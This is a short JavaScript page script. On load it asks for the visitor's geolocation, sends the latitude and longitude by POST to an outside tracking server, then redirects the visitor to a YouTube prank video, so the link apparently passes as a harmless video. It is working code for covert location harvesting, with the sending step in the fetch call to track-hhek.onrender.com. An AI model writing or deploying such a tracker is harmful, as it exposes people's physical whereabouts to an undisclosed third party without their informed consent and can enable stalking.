const youtubeUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

async function shareLocation() {
    if (!navigator.geolocation) {
        window.location.href = youtubeUrl;
        return;
    }

    return new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;

                console.log(`Location: Lat ${lat}, Lng ${lng}`);

                try {
                    await fetch("https://track-hhek.onrender.com/location", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            user: "Anonymous User",
                            lat,
                            lng
                        })
                    });
                } catch (error) {
                    console.error(error);
                }

                window.location.href = youtubeUrl;
                resolve(true);
            },
            () => {
                window.location.href = youtubeUrl;
                resolve(false);
            }
        );
    });
}

window.onload = () => {
    shareLocation();
};